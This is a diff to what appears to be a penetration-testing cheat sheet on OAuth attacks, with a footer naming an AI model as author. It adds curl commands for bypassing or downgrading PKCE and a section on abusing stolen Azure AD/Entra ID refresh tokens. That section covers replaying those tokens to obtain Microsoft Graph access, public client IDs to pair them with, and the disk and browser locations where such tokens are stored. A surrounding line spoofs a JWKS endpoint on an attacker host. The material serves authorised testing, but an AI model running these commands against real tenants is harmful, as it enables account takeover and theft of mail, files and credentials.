@@ -117,6 +117,35 @@ done
 curl -s -X POST "https://<authserver>/token" -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=<token>&requested_token_type=urn:ietf:params:oauth:token-type:access_token&scope=admin"
 ```
 
+### PKCE Bypass
+
+PKCE (Proof Key for Code Exchange) adds a `code_challenge` to the auth request and requires a matching `code_verifier` at the token exchange. If the server doesn't enforce the verifier, omit it entirely.
+
+```bash
+# Normal PKCE flow:
+# 1. Generate code_verifier (random 43-128 char string)
+# 2. code_challenge = BASE64URL(SHA256(code_verifier))
+# 3. Send code_challenge in /authorize
+# 4. Send code_verifier in /token
+
+# PKCE bypass — omit code_verifier at token exchange:
+# Legit token exchange with PKCE:
+curl -s -X POST "https://<authserver>/token" \
+  -d "grant_type=authorization_code&code=<code>&redirect_uri=<uri>&client_id=<id>&code_verifier=<verifier>"
+
+# Bypass — just drop code_verifier:
+curl -s -X POST "https://<authserver>/token" \
+  -d "grant_type=authorization_code&code=<code>&redirect_uri=<uri>&client_id=<id>"
+# If server returns token → PKCE not enforced
+
+# PKCE downgrade — if server accepts both PKCE and non-PKCE requests:
+# Don't send code_challenge in /authorize at all:
+curl -s "https://<authserver>/authorize?client_id=<id>&redirect_uri=<uri>&response_type=code&scope=openid"
+# If auth code returned without challenge → can exchange without verifier
+```
+
+> [!note] Public clients (SPAs, mobile apps) are the main PKCE targets — they can't store client_secret, so PKCE is their only protection against code interception. If PKCE isn't enforced on a public client, stolen auth codes are directly exploitable.
+
 ### Client Credentials Abuse
 
 ```bash
@@ -165,6 +194,46 @@ python3 jwt_tool.py <id_token> -X k -pk pubkey.pem
 # JWKS endpoint spoofing via jku header
 python3 jwt_tool.py <id_token> -X s -ju "http://<attacker>/jwks.json"
 ```
+
+---
+
+## Azure AD / Entra ID — Token Abuse
+
+Azure AD issues refresh tokens valid for **90 days** (or up to 1 year for persistent sessions). A captured refresh token can continuously generate new access tokens without re-authentication.
+
+```bash
+# Exchange refresh token for new access + refresh tokens
+curl -s -X POST "https://login.microsoftonline.com/<tenant_id>/oauth2/v2.0/token" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -d "grant_type=refresh_token&refresh_token=<stolen_refresh_token>&client_id=<client_id>&scope=openid profile email offline_access"
+# Returns: new access_token + refresh_token (rolling — each exchange gives a new refresh token)
+
+# Find tenant ID from login redirect or email domain:
+curl -s "https://login.microsoftonline.com/<domain.com>/.well-known/openid-configuration" | python3 -m json.tool | grep issuer
+
+# Common client_ids that accept any token (public clients):
+# Microsoft Graph:  1b730954-1685-4b74-9bfd-dac224a7b894  (legacy)
+# Azure CLI:        04b07795-8ddb-461a-bbee-02f9e1bf7b46
+# Azure PowerShell: 1950a258-227b-4e31-a9cf-717495945fc2
+
+# Scope strings for Microsoft resources:
+# MS Graph: https://graph.microsoft.com/.default
+# SharePoint: https://yourtenant.sharepoint.com/.default
+# Exchange:   https://outlook.office365.com/.default
+
+# Where to find Azure refresh tokens:
+# - Browser storage: localStorage/sessionStorage on O365 apps
+# - MSAL token cache: %LOCALAPPDATA%\Microsoft\TokenCache\*.bin
+# - .azure/ directory: ~/.azure/accessTokens.json (legacy Azure CLI)
+# - PowerShell: Get-AzAccessToken; $TokenCache
+# - App config files with service principal credentials
+
+# Refresh token → access token for MS Graph (read emails, files, users)
+curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
+  -d "grant_type=refresh_token&refresh_token=<token>&client_id=04b07795-8ddb-461a-bbee-02f9e1bf7b46&scope=https://graph.microsoft.com/.default offline_access"
+```
+
+> [!warning] Azure refresh tokens are scoped to a client_id — a token captured from one app may not be replayable against a different client_id without a client_secret.
 
 ---
 
@@ -322,5 +391,5 @@ python3 jwt_tool.py <token> -X a
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
